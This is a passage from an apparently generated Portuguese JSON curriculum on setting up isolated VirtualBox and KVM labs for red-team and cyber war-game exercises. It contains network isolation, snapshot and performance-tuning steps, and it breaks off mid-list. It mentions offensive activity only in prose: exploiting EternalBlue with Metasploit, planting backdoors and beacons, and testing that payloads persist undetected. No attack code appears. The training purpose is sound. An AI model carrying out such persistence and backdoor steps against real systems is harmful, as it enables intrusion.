                                  "tips": "Rotule adaptadores (Adapter 1: Internal, Adapter 2: Host-Only) para organização.",
                                  "learningObjective": "Gerenciar múltiplas interfaces virtuais para cenários de isolamento segmentado.",
                                  "commonMistakes": [
                                    "Ordem errada de adaptadores",
                                    "Conflitos de MAC address",
                                    "Não reiniciar serviços de rede"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Conectividade e Isolamento Total",
                                  "subSteps": [
                                    "Das VMs em Internal Network, teste ping interno (sucesso), ping host (falha), ping 8.8.8.8 (falha).",
                                    "Via Host-Only, teste ping host (sucesso), ping outra VM Host-Only (sucesso), mas sem external.",
                                    "Use ferramentas como nmap para scan interno (permitido) vs external (bloqueado).",
                                    "Monitore tráfego com Wireshark no host para confirmar ausência de pacotes externos.",
                                    "Documente resultados em um relatório simples de conectividade."
                                  ],
                                  "verification": "Relatório confirma: comunicação interna ok, host-only ok, zero acesso externo ou vazamentos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramentas: ping, nmap, Wireshark",
                                    "Bloco de notas para relatório"
                                  ],
                                  "tips": "Execute testes em ambas direções (VM1->VM2 e vice-versa) para bidirectionalidade.",
                                  "learningObjective": "Validar configurações de isolamento para compliance com regras de engajamento Red Team.",
                                  "commonMistakes": [
                                    "Testes incompletos (esquecer external)",
                                    "Interferência de firewall na VM",
                                    "Wireshark no adaptador errado"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício Red Team, configure duas VMs Kali em 'redteam-internal': VM1 como C2 server (porta 4444), VM2 como agente. Internal permite comunicação C2 sem risco de vazamento para internet; adicione Host-Only na VM1 para relatório seguro ao host sem expor o lab.",
                              "finalVerifications": [
                                "VMs em Internal Network se comunicam via ping/nmap, mas não acessam host ou internet.",
                                "Host-Only permite comunicação host-VM sem exposição externa.",
                                "Múltiplas interfaces por VM estão ativas e segmentadas corretamente.",
                                "Wireshark confirma zero tráfego para fora do lab isolado.",
                                "Reinício das VMs preserva configurações de isolamento.",
                                "Relatório de testes documenta todos cenários de sucesso/falha."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de adaptadores (sem erros de nome/IP).",
                                "Número e funcionalidade de interfaces virtuais criadas.",
                                "Resultados de testes de conectividade e isolamento (100% conformidade).",
                                "Tempo total dentro do estimado (80 minutos máx).",
                                "Qualidade do relatório e identificação de potenciais vazamentos.",
                                "Explicação clara dos modos Internal vs Host-Only."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Conceitos de sub-redes e roteamento.",
                                "Segurança Cibernética: Controles de acesso e segmentação de rede.",
                                "Virtualização: Gerenciamento avançado de VMs e hypervisors.",
                                "Testes de Penetração: Labs isolados para simulações de ataque.",
                                "Sistemas Operacionais: Configuração de interfaces de rede em Linux/Windows."
                              ],
                              "realWorldApplication": "Em operações Red Team, como jogos de guerra cibernéticos, esse isolamento previne vazamentos acidentais de tráfego malicioso para a internet real, garantindo compliance com regras de engajamento (RoE) e permitindo simulações seguras de C2, pivoting e exfiltração em labs controlados."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.1.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.7.1.1.3.3",
                            "name": "Gerenciar VMs e Snapshots",
                            "description": "Criar VMs com OVA/OVF de cenários de ameaça, gerenciar checkpoints para persistência pós-exploit e exportar appliances para compartilhamento em equipes de operações cibernéticas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Importar e Criar VM a partir de Arquivos OVA/OVF",
                                  "subSteps": [
                                    "Baixar ou obter arquivos OVA/OVF de cenários de ameaça pré-configurados.",
                                    "Abrir o VirtualBox e selecionar 'File > Import Appliance'.",
                                    "Navegar até o arquivo OVA/OVF, revisar configurações de importação (CPU, RAM, rede).",
                                    "Ajustar configurações se necessário (ex: bridged adapter para rede real).",
                                    "Clicar em 'Import' e aguardar conclusão."
                                  ],
                                  "verification": "VM aparece na lista principal do VirtualBox e inicia sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "VirtualBox instalado",
                                    "Arquivo OVA/OVF de cenário de ameaça",
                                    "Espaço em disco suficiente (mín. 50GB)"
                                  ],
                                  "tips": "Sempre verifique a integridade do arquivo OVA com hash SHA256 antes de importar.",
                                  "learningObjective": "Dominar a importação de appliances virtuais para setups rápidos de ambientes de teste.",
                                  "commonMistakes": [
                                    "Não ajustar rede para bridged, causando isolamento",
                                    "Ignorar requisitos de hardware, levando a falhas de boot",
                                    "Importar sem verificar senha root/admin pré-configurada"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar e Gerenciar Snapshots/Checkpoints",
                                  "subSteps": [
                                    "Iniciar a VM importada e acessar o ambiente (login com credenciais padrão).",
                                    "No menu da VM, selecionar 'Machine > Take Snapshot' e nomear como 'Baseline'.",
                                    "Realizar ações simuladas de exploit (ex: instalar payload persistente).",
                                    "Criar snapshot adicional nomeado 'Pós-Exploit' para capturar estado infectado.",
                                    "Reverter para snapshot 'Baseline' via 'Machine > Snapshots' para testar restauração."
                                  ],
                                  "verification": "Snapshots listados corretamente e reversão restaura estado original sem perda de dados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "VM importada ativa",
                                    "Ferramentas de exploit simuladas (ex: Metasploit ou scripts bash)"
                                  ],
                                  "tips": "Nomeie snapshots com datas e descrições claras para rastreabilidade em equipes.",
                                  "learningObjective": "Aprender a usar snapshots para capturar e reverter estados de VM de forma eficiente.",
                                  "commonMistakes": [
                                    "Criar snapshots durante I/O intenso, causando corrupção",
                                    "Exceder limite de snapshots sem limpeza",
                                    "Confundir snapshots com clones"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Demonstrar Persistência Pós-Exploit com Snapshots",
                                  "subSteps": [
                                    "Reverter para snapshot 'Baseline' e confirmar limpeza do exploit.",
                                    "Executar exploit novamente e verificar persistência no snapshot 'Pós-Exploit'.",
                                    "Testar detecção: rodar scans antivírus ou ferramentas de forensics na VM infectada.",
                                    "Criar branch de snapshot para experimentos adicionais sem afetar o principal.",
                                    "Documentar diferenças entre snapshots usando diff de arquivos ou logs."
                                  ],
                                  "verification": "Persistência confirmada: exploit sobrevive reboot e reversão seletiva.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "VM com snapshots",
                                    "Ferramentas de forensics (ex: Volatility, Autopsy)",
                                    "Payloads de teste não-maliciosos"
                                  ],
                                  "tips": "Use snapshots em branches para cenários 'what-if' em jogos de guerra cibernéticos.",
                                  "learningObjective": "Aplicar snapshots para simular e testar persistência de ataques em ambientes controlados.",
                                  "commonMistakes": [
                                    "Não testar reboot após snapshot",
                                    "Ignorar overhead de disco com múltiplos snapshots",
                                    "Reverter snapshot errado, perdendo evidências"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Exportar VM como Appliance para Compartilhamento",
                                  "subSteps": [
                                    "Selecionar a VM com snapshots no VirtualBox.",
                                    "Ir para 'File > Export Appliance', escolher formato OVA.",
                                    "Incluir todos os snapshots na exportação.",
                                    "Definir manifesto (hash) e senha de exportação para segurança.",
                                    "Salvar arquivo OVA e testar importação em outra instância de VirtualBox."
                                  ],
                                  "verification": "Arquivo OVA exportado importa corretamente em outra máquina, preservando snapshots.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "VM pronta com snapshots",
                                    "VirtualBox em máquina de destino para teste"
                                  ],
                                  "tips": "Compacte o OVA com 7z para reduzir tamanho antes de compartilhar via SFTP ou Git.",
                                  "learningObjective": "Exportar ambientes virtuais portáteis para colaboração em equipes de operações cibernéticas.",
                                  "commonMistakes": [
                                    "Esquecer de incluir snapshots no export",
                                    "Não definir senha, expondo appliance",
                                    "Exportar sem bridged network config"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético, importe uma OVA de um servidor Windows vulnerável a EternalBlue. Crie snapshot 'Baseline', explore com Metasploit para backdoor, snapshot 'Pós-Exploit'. Reverta para baseline para blue team testar detecção, então exporte OVA para compartilhar com a equipe remota via secure drop.",
                              "finalVerifications": [
                                "VM criada de OVA inicia e executa exploits sem crashes.",
                                "Snapshots revertem estados corretamente, preservando persistência.",
                                "Export OVA importa em novo VirtualBox com todos snapshots intactos.",
                                "Tempo total de setup < 90 minutos para ambiente completo.",
                                "Documentação de snapshots cobre baseline, exploit e forensics.",
                                "Teste de persistência: payload sobrevive 3 reboots e scans."
                              ],
                              "assessmentCriteria": [
                                "Precisão na importação/exportação sem erros de configuração (90% sucesso).",
                                "Gestão de 5+ snapshots com nomes descritivos e branches corretos.",
                                "Demonstração de persistência pós-exploit com evidências (logs/screenshots).",
                                "Eficiência temporal: completar em < 90 min com verificações.",
                                "Qualidade da documentação para compartilhamento em equipe.",
                                "Habilidade em troubleshooting comum (ex: rede, disco)."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Configuração de adapters bridged/NAT para simulações realistas.",
                                "Programação: Scripts para automação de snapshots via VBoxManage CLI.",
                                "Forensics: Análise de memória/disco entre snapshots com Volatility.",
                                "Gestão de Projetos: Versionamento de VMs similar a Git para equipes.",
                                "Ética em Cibersegurança: Uso responsável de cenários de ameaça."
                              ],
                              "realWorldApplication": "Em operações de Red Team, equipes criam VMs de vítimas infectadas via OVA, snapshotam pós-exploit para análise, e exportam para Blue Teams treinarem detecção/resposta, acelerando CTFs e exercícios de defesa cibernética em organizações como CERTs ou empresas Fortune 500."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.1.1.1.3"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.1.1.4",
                        "name": "KVM como Plataforma de Virtualização",
                        "description": "Implementação do KVM (Kernel-based Virtual Machine) em Linux para hypervisor Tipo 1 de alto desempenho, adequado para labs escaláveis em servidores dedicados para jogos de guerra cibernética.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.1.1.4.1",
                            "name": "Preparar Host para KVM",
                            "description": "Instalar pacotes KVM/QEMU/libvirt em distribuições Linux (Ubuntu/CentOS), verificar suporte KVM via 'kvm-ok' e configurar bridge de rede para isolamento em ambientes de produção Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Verificar Suporte a Hardware e Atualizar Sistema",
                                  "subSteps": [
                                    "Atualize o sistema operacional: 'sudo apt update && sudo apt upgrade -y' no Ubuntu ou 'sudo dnf update -y' no CentOS/RHEL.",
                                    "Verifique suporte a virtualização na CPU: 'egrep -c '(vmx|svm)' /proc/cpuinfo' (deve retornar valor > 0).",
                                    "Confirme módulos KVM carregados: 'lsmod | grep kvm' e carregue se necessário com 'sudo modprobe kvm_intel' (Intel) ou 'sudo modprobe kvm_amd' (AMD).",
                                    "Instale ferramenta de verificação: 'sudo apt install cpu-checker' (Ubuntu) ou equivalente no CentOS.",
                                    "Execute pré-verificação: 'sudo kvm-ok' após instalação (instale se ausente)."
                                  ],
                                  "verification": "Comando 'kvm-ok' retorna 'KVM acceleration can be used' e CPU flags confirmadas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso root/sudo",
                                    "Conexão à internet",
                                    "Terminal Linux"
                                  ],
                                  "tips": "Reinicie o servidor se módulos não carregarem automaticamente; verifique BIOS/UEFI para VT-x/AMD-V ativado.",
                                  "learningObjective": "Identificar e habilitar suporte de hardware essencial para aceleração KVM.",
                                  "commonMistakes": [
                                    "Ignorar configurações de BIOS",
                                    "Executar sem privilégios root",
                                    "Confundir suporte CPU com RAM insuficiente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar Pacotes KVM/QEMU/libvirt",
                                  "subSteps": [
                                    "Instale pacotes no Ubuntu: 'sudo apt install qemu-kvm libvirt-clients libvirt-daemon-system bridge-utils virt-manager cpu-checker -y'.",
                                    "Instale pacotes no CentOS/RHEL: 'sudo dnf install @virtualization qemu-kvm libvirt libvirt-client virt-install bridge-utils -y'.",
                                    "Adicione usuário ao grupo libvirt: 'sudo usermod -aG libvirt $USER' e 'sudo usermod -aG kvm $USER'.",
                                    "Habilite e inicie serviços: 'sudo systemctl enable --now libvirtd' (CentOS) ou 'sudo systemctl enable --now virtlogd.socket libvirtd.socket libvirtd'.",
                                    "Verifique status: 'sudo systemctl status libvirtd'."
                                  ],
                                  "verification": "Serviços libvirtd rodando sem erros e 'virsh version' exibe versão instalada.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso root/sudo",
                                    "Repositórios padrão ativados",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Use mirrors locais se download lento; reinicie sessão após adicionar grupos para aplicar permissões.",
                                  "learningObjective": "Instalar corretamente o stack KVM/QEMU/libvirt adaptado à distribuição Linux.",
                                  "commonMistakes": [
                                    "Omitir bridge-utils para rede",
                                    "Não habilitar serviços persistentemente",
                                    "Instalar pacotes errados para a distro"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Verificar Suporte KVM e Configurações Básicas",
                                  "subSteps": [
                                    "Execute verificação completa: 'sudo /usr/sbin/kvm-ok' ou 'virt-host-validate'.",
                                    "Teste libvirt: 'virsh list --all' (deve listar domínio padrão).",
                                    "Configure firewall se ativo: 'sudo ufw allow from 192.168.122.0/24' (libvirt default) ou firewalld equivalente.",
                                    "Defina rede padrão: 'virsh net-list --all' e 'virsh net-start default' se inativa.",
                                    "Crie pool de storage padrão: 'virsh pool-define-as default dir --target /var/lib/libvirt/images && virsh pool-autostart default'."
                                  ],
                                  "verification": "'virt-host-validate' passa todos os checks QEMU e libvirt.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ferramentas instaladas do step 2",
                                    "Acesso root"
                                  ],
                                  "tips": "Ignore warnings menores de validação se hardware confirmado; use 'virsh' sem sudo após grupos.",
                                  "learningObjective": "Validar instalação KVM e preparar recursos básicos como redes e storage.",
                                  "commonMistakes": [
                                    "Executar virsh como root desnecessariamente",
                                    "Deixar rede default inativa",
                                    "Ignorar validações de firewall"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Bridge de Rede para Isolamento",
                                  "subSteps": [
                                    "Identifique interface principal: 'ip link show' (ex: enp0s3).",
                                    "Ubuntu (Netplan): Crie/edit /etc/netplan/01-netcfg.yaml com bridge br0 mapeando eth0, aplique 'sudo netplan apply'.",
                                    "CentOS (NetworkManager): 'nmcli con add type bridge ifname br0 stp no', 'nmcli con add type bridge-slave ifname enp0s3 master br0', 'nmcli con up bridge-br0'.",
                                    "Configure libvirt para usar bridge: Edite /etc/libvirt/qemu.conf se necessário, reinicie libvirtd.",
                                    "Teste conectividade: 'ip addr show br0' e ping de outra máquina."
                                  ],
                                  "verification": "Bridge br0 up com IP do host, VMs podem ser anexadas sem NAT (testar com VM dummy).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de texto (nano/vim)",
                                    "Conhecimento da interface de rede"
                                  ],
                                  "tips": "Backup configs de rede antes; use IP estático no bridge para produção Red Team.",
                                  "learningObjective": "Implementar rede bridge isolada para VMs em cenários de segurança.",
                                  "commonMistakes": [
                                    "Perder conectividade host durante config",
                                    "Confundir Netplan com ifcfg",
                                    "Não mascarar MAC de VMs"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar Configuração Final e Ajustes de Segurança",
                                  "subSteps": [
                                    "Crie VM de teste: 'virt-install --name test-vm --ram 1024 --vcpus 1 --disk size=5 --network bridge=br0 --graphics none --console pty,target_type=serial --location http://archive.ubuntu.com/ubuntu/dists/jammy/main/installer-amd64/'.",
                                    "Inicie e conecte: 'virsh start test-vm' e 'virsh console test-vm'.",
                                    "Ajuste SELinux/AppArmor se ativo: 'setsebool -P virt_use_nfs 1' (CentOS).",
                                    "Monitore logs: 'journalctl -u libvirtd' para erros.",
                                    "Remova VM teste: 'virsh destroy test-vm && virsh undefine test-vm'."
                                  ],
                                  "verification": "VM inicia no bridge isolado, acessível externamente sem expor host.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "ISO ou URL de instalação",
                                    "Acesso rede"
                                  ],
                                  "tips": "Use --import para disks existentes; isole com VLANs para Red Team real.",
                                  "learningObjective": "Validar end-to-end e aplicar hardening para ambientes de produção.",
                                  "commonMistakes": [
                                    "Expor bridge à WAN",
                                    "Ignorar SELinux denials",
                                    "VM não bootar por rede errada"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor Ubuntu 22.04 dedicado a Red Team, execute os steps para preparar KVM com bridge br0 isolado via VLAN 100. Crie 3 VMs attacker/victim/defender conectadas ao br0, simulando rede interna sem NAT, permitindo tráfego real de exploits sem afetar produção.",
                              "finalVerifications": [
                                "'kvm-ok' confirma aceleração ativa.",
                                "'virsh net-list' mostra rede bridge ativa.",
                                "'brctl show' lista bridge com interfaces de VM.",
                                "'virt-host-validate' passa todos os testes.",
                                "VM teste faz ping bidirecional via bridge.",
                                "Logs libvirtd sem erros críticos."
                              ],
                              "assessmentCriteria": [
                                "Instalação completa sem falhas de dependências.",
                                "Suporte KVM hardware-software validado 100%.",
                                "Bridge funcional com isolamento (no ARP spoofing leak).",
                                "Serviços persistem após reboot.",
                                "Usuário não-root gerencia libvirt.",
                                "Configurações seguras (firewall, SELinux)."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas Linux (gerenciamento de pacotes e serviços).",
                                "Redes de Computadores (configuração de bridges e VLANs).",
                                "Segurança Cibernética (isolamento de VMs para testes ofensivos).",
                                "Infraestrutura de TI (virtualização em data centers)."
                              ],
                              "realWorldApplication": "Em operações Red Team, prepara hosts para Purple Team exercises, permitindo simulação de ataques em VMs isoladas via bridge, com tráfego mirrored para análise, sem risco à rede corporativa ou detecção precoce."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.1.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.7.1.1.4.2",
                            "name": "Instalar e Configurar via Virt-Manager",
                            "description": "Usar interface gráfica Virt-Manager ou CLI virsh para criar VMs, alocar recursos CPU/RAM e configurar redes virtuais isoladas com firewalld para simulações de IOCs (Indicadores de Compromisso).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar Virt-Manager e Dependências KVM",
                                  "subSteps": [
                                    "Atualize o sistema operacional com 'sudo dnf update' (para Fedora/RHEL) ou equivalente.",
                                    "Instale pacotes necessários: 'sudo dnf install virt-manager libvirt qemu-kvm virt-install bridge-utils firewalld'.",
                                    "Habilite e inicie o serviço libvirt: 'sudo systemctl enable --now libvirtd'.",
                                    "Adicione o usuário ao grupo libvirt: 'sudo usermod -aG libvirt $(whoami)' e faça logout/login.",
                                    "Instale uma imagem ISO de SO para teste, como Ubuntu Server."
                                  ],
                                  "verification": "Execute 'virt-manager' no terminal e confirme que abre sem erros de permissão.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso root ou sudo",
                                    "Conexão à internet",
                                    "ISO de SO teste (ex: ubuntu-22.04.iso)"
                                  ],
                                  "tips": [
                                    "Use repositórios EPEL se necessário para pacotes extras.",
                                    "CLI alternativa: 'virsh' para verificação com 'virsh list --all'."
                                  ],
                                  "learningObjective": "Preparar o ambiente Linux para virtualização KVM com Virt-Manager.",
                                  "commonMistakes": [
                                    "Esquecer de reiniciar sessão após adicionar ao grupo libvirt.",
                                    "Não habilitar firewalld antecipadamente."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Conexão Inicial e Verificar KVM",
                                  "subSteps": [
                                    "Abra Virt-Manager e conecte à 'QEMU/KVM' local.",
                                    "Verifique suporte KVM: 'lsmod | grep kvm' e 'kvm-ok' (instale cpu-checker se preciso).",
                                    "Configure autenticação: edite /etc/libvirt/libvirtd.conf para unix_sock_group = libvirt.",
                                    "Reinicie libvirtd: 'sudo systemctl restart libvirtd'.",
                                    "Teste CLI: 'virsh version' para confirmar instalação."
                                  ],
                                  "verification": "Virt-Manager mostra host KVM sem erros e 'virsh list' retorna lista vazia.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal com sudo",
                                    "cpu-checker pacote opcional"
                                  ],
                                  "tips": [
                                    "Ative aceleração de hardware em BIOS/UEFI se kvm-ok falhar.",
                                    "Monitore logs com 'journalctl -u libvirtd'."
                                  ],
                                  "learningObjective": "Estabelecer conexão funcional entre Virt-Manager e libvirt para gerenciamento de VMs.",
                                  "commonMistakes": [
                                    "Ignorar verificação KVM levando a VMs lentas.",
                                    "Configurações de SELinux bloqueando libvirt."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar VM e Alocar Recursos CPU/RAM",
                                  "subSteps": [
                                    "Em Virt-Manager, clique 'Create a new virtual machine'.",
                                    "Selecione 'Local install media (ISO)', escolha ISO e configure 2 vCPUs, 4GB RAM, 20GB disco.",
                                    "Ajuste hardware: Overview > CPUs: 2 sockets/1 core; Memory: 4096 MiB.",
                                    "Instale SO na VM e finalize boot.",
                                    "CLI alternativa: 'virt-install --name testvm --ram 4096 --vcpus 2 --disk size=20 --cdrom ubuntu.iso --os-variant ubuntu22.04'."
                                  ],
                                  "verification": "VM inicia, alocação aparece em 'virsh dominfo testvm' (CPU/RAM corretos).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "ISO baixada",
                                    "Espaço disco 50GB+"
                                  ],
                                  "tips": [
                                    "Use os-variant para otimização automática.",
                                    "Monitore uso real com 'htop' no host."
                                  ],
                                  "learningObjective": "Criar VM funcional com alocação precisa de recursos para simulações.",
                                  "commonMistakes": [
                                    "Sobrealocação de RAM causando OOM no host.",
                                    "Não selecionar virtio drivers para performance."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Rede Virtual Isolada com Firewalld",
                                  "subSteps": [
                                    "Em Virt-Manager, edite VM > Network Interfaces > Add > Network source: 'default' ou crie nova isolada.",
                                    "Crie rede isolada: Edit > Connection Details > Virtual Networks > + > Isolated, sem forward.",
                                    "Configure firewalld: 'sudo firewall-cmd --permanent --new-zone=vm-isolated --add-interface=virbr1' e 'sudo firewall-cmd --reload'.",
                                    "Aplique à VM: reconfigure interface para nova rede e reinicie VM.",
                                    "Teste isolamento: ping entre VMs na rede, mas não para host externo."
                                  ],
                                  "verification": "VMs na rede isolada se comunicam; 'firewall-cmd --list-all-zones' mostra zona; sem tráfego externo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Firewalld ativo"
                                  ],
                                  "tips": [
                                    "CLI virsh: 'virsh net-define isolated.xml' para rede custom.",
                                    "Use nftables para regras avançadas IOC."
                                  ],
                                  "learningObjective": "Isolar rede virtual para simulações seguras de IOCs em jogos cibernéticos.",
                                  "commonMistakes": [
                                    "Rede default permite forward indesejado.",
                                    "Esquecer --permanent em firewalld."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie uma VM 'victim' (Ubuntu, 2CPU/4GB) e 'attacker' (Kali, 4CPU/8GB) em rede isolada 'redteam-net'. Configure firewalld para bloquear saída, simule IOC instalando beacon na victim e monitore tráfego com tcpdump na attacker.",
                              "finalVerifications": [
                                "Virt-Manager gerencia VMs sem erros.",
                                "VMs bootam com CPU/RAM alocados corretamente (virsh dominfo).",
                                "Rede isolada: VMs pingam entre si, mas não host/internet.",
                                "Firewalld zona ativa bloqueia tráfego externo.",
                                "CLI virsh lista e controla VMs equivalentemente.",
                                "Sem vazamento de IOCs para fora da rede virtual."
                              ],
                              "assessmentCriteria": [
                                "Instalação completa sem dependências faltando (100% pacotes).",
                                "Recursos VM exatos: CPU/RAM/disco conforme especificado.",
                                "Rede 100% isolada, verificada por testes de conectividade.",
                                "Firewalld configurado corretamente com zona dedicada.",
                                "Capacidade de simular IOC sem comprometer host.",
                                "Documentação de comandos CLI/GUI usada."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Configuração de bridges e VLANs virtuais.",
                                "Segurança: Firewalld/nftables e detecção IOCs.",
                                "Sistemas Operacionais: Gerenciamento kernel KVM/QEMU.",
                                "Programação: Scripts Ansible/virsh para automação.",
                                "Administração Linux: SELinux, serviços systemd."
                              ],
                              "realWorldApplication": "Em operações Red Team, montar labs isolados para jogos de guerra cibernética, simulando IOCs como C2 beacons ou ransomware sem risco ao ambiente de produção, permitindo treinamento realista de detecção e resposta."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.1.1.1.2"
                            ]
                          },
                          {
                            "id": "10.1.7.1.1.4.3",
                            "name": "Otimizar para Desempenho em Labs",
                            "description": "Habilitar hugepages, pinning de CPU e live migration para cenários de alta carga em jogos cibernéticos, testando persistência com ferramentas de ethical hacking.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Habilitar e Configurar Hugepages no Host KVM",
                                  "subSteps": [
                                    "Verificar suporte a hugepages no kernel com 'cat /proc/cpuinfo | grep pdpe1gb' ou similar.",
                                    "Configurar hugepages no GRUB adicionando 'hugepagesz=2M hugepages=X' onde X é calculado baseado em RAM disponível (ex: 4096 para 8GB).",
                                    "Atualizar GRUB com 'update-grub' e reiniciar o host.",
                                    "Verificar alocação com 'cat /proc/meminfo | grep Huge'",
                                    "Montar hugetlbfs em /dev/hugepages com 'mkdir /dev/hugepages && mount -t hugetlbfs none /dev/hugepages'"
                                  ],
                                  "verification": "Executar 'cat /proc/meminfo' e confirmar que HugePages_Total > 0 e HugePages_Free próximo a zero após uso.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso root ao host Linux (Ubuntu/Debian)",
                                    "Editor de texto (nano/vim)",
                                    "Comando GRUB"
                                  ],
                                  "tips": "Calcule hugepages como (RAM_total * 0.5 / 2MB) para deixar margem para o host.",
                                  "learningObjective": "Entender e implementar hugepages para reduzir TLB misses em VMs de alta carga.",
                                  "commonMistakes": "Esquecer de reiniciar após editar GRUB; alocar páginas insuficientes causando OOM kills."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar CPU Pinning para VMs KVM",
                                  "subSteps": [
                                    "Identificar núcleos disponíveis com 'lscpu' e 'numactl --hardware'.",
                                    "Editar XML da VM com 'virsh edit <vm-name>' adicionando <cputune> com <vcpupin vcpu='0' cpuset='0'/> etc.",
                                    "Definir afinidade para processos QEMU com 'taskset -cp <cores> <qemu-pid>'.",
                                    "Reiniciar a VM e verificar pinning com 'virsh vcpuinfo <vm-name>'.",
                                    "Testar balanceamento com 'htop' ou 'mpstat' sob carga."
                                  ],
                                  "verification": "'virsh vcpuinfo <vm-name>' mostra CPUs pinned corretamente sem migração entre sockets NUMA.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "libvirt instalado",
                                    "VM KVM existente",
                                    "Ferramentas: lscpu, htop, virsh"
                                  ],
                                  "tips": "Use 'numactil --show' para evitar cross-socket pinning em sistemas multi-socket.",
                                  "learningObjective": "Dominar alocação exclusiva de CPUs para VMs, minimizando context switches em cenários Red Team.",
                                  "commonMistakes": "Pinning em CPUs do host critical (ex: 0 para systemd); oversubscription de cores."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Live Migration Otimizada",
                                  "subSteps": [
                                    "Configurar rede de migração compartilhada ou tunnel com 'virsh net-list' e editar libvirt network XML.",
                                    "Habilitar migração em VMs editando XML: <migration> com auto-converge e post-copy.",
                                    "Testar migração seca com 'virsh migrate --live <vm-name> qemu+ssh://target-host/system'.",
                                    "Otimizar com hugepages na VM guest: editar /etc/default/grub guest-side.",
                                    "Monitorar com 'virsh domstats <vm-name>' durante migração."
                                  ],
                                  "verification": "Live migration completa em <30s sem downtime perceptível e throughput >1GB/s.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Dois hosts KVM networked",
                                    "SSH keys configurados",
                                    "libvirt com migração habilitada"
                                  ],
                                  "tips": "Use post-copy para VMs com memória > host RAM disponível.",
                                  "learningObjective": "Configurar migração contínua para manter labs cibernéticos ativos durante falhas.",
                                  "commonMistakes": "Rede não isolada causando leaks de tráfego sensível; esquecer hugepages no guest."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Persistência e Desempenho com Ferramentas de Ethical Hacking",
                                  "subSteps": [
                                    "Simular alta carga na VM com 'stress-ng --cpu 8 --io 4 --vm 2 --timeout 300s'.",
                                    "Executar ferramentas como Volatility para memory forensics pré/pós migração.",
                                    "Testar persistência com Metasploit payloads ou rootkits simulados, verificando sobrevivência.",
                                    "Medir latência com 'fio' para I/O e 'sysbench' para CPU durante ataques simulados.",
                                    "Analisar logs com 'journalctl -u libvirtd' e 'dmesg | grep kvm'."
                                  ],
                                  "verification": "Desempenho mantém >95% baseline pós-otimizações e migração; payloads persistem sem detecção.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "stress-ng, Volatility, Metasploit, sysbench, fio instalados na VM",
                                    "Payloads simulados éticos"
                                  ],
                                  "tips": "Use VMs snapshot para reset rápido entre testes.",
                                  "learningObjective": "Validar otimizações em cenários realistas de jogos cibernéticos com alta carga adversária.",
                                  "commonMistakes": "Testes sem baseline; ignorar overhead de ferramentas de hacking."
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, otimize uma VM KVM rodando um honeypot sob ataque DDoS simulado: habilite hugepages (reduz latência 20%), pin CPUs (estabiliza FPS em jogo cibernético), migre live para outro host durante pico de tráfego, teste com Volatility para confirmar persistência de backdoor sem crashes.",
                              "finalVerifications": [
                                "Hugepages alocados e utilizados >80% em VMs ativas.",
